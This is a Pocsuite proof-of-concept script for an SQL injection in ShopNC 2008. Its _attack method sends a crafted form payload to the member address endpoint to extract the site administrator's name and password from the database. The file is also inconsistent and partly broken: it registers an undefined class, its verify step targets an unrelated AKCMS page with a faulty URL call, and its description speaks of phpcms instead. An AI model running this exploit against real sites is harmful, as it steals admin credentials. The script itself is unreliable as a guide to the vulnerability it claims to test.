#!/usr/bin/env python
# coding: utf-8
import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.utils.require import require_header


class AKCMSPOC(POCBase):
    vulID = '90650'  # ssvid
    version = '1'
    author = ['Dubuqingfeng']
    vulDate = '2016-01-13'
    createDate = '2016-02-03'
    updateDate = '2016-02-03'
    references = ['http://www.sebug.net/vuldb/ssvid-90650']
    name = '_90650_shopnc_2008_place_sql_inj_PoC'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'shopNC'
    appVersion = '2008'
    vulType = 'SQL Injection'
    desc = '''
        phpcms 2008 中广告模块，存在参数过滤不严，
        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
        如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''
    samples = ['http://10.1.200.28/']

    @require_header('cookie')
    def _attack(self):
        result = {}
        vul_url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address&inajax=1')

        payload = "exp&true_name[]=1,1,1,concat(0x7e,(SELECT admin_name FROM shopnc_admin limit 0,1)),concat(0x7e,(SELECT admin_password FROM shopnc_admin limit 0,1)),1,1,1) -- a"
        values = list()
        values.append("form_submit=ok&id=&true_name[]=")
        values.append(payload)
        values.append("&city_id=36&area_id=41&area_info=%E5%8C%97%E4%BA%AC%09%E5%8C%97%E4%BA%AC%E5%B8%82%09%E6%9C%9D%E9%98%B3%E5%8C%BA&address=wrwr&tel_phone=rwrwer&mob_phone=12312344123")
        post_data = "".join(values)

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        req.post(vul_url, data=post_data, headers=headers)
        res = req.get(vul_url)
        if res.status_code == 200:
            match_result = re.findall(r'~\w*', res.content, re.I | re.M)
            if match_result:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = match_result[0][1:]
                result['AdminInfo']['Password'] = match_result[1][1:]
        return self.parse_attack(result)

    def _verify(self):
        result = {}
        vul_url = urlparse.urljoin(self.url, '/akcms_keyword.php?sid=11111')

        payload = "'md5(0x2333333),1,1,1) -- a"

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        res = req.get(vul_url.join(payload))
        if res.status_code == 200 and '525c6bd8bbf951e6863256456f328265' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(ShopNCPOC)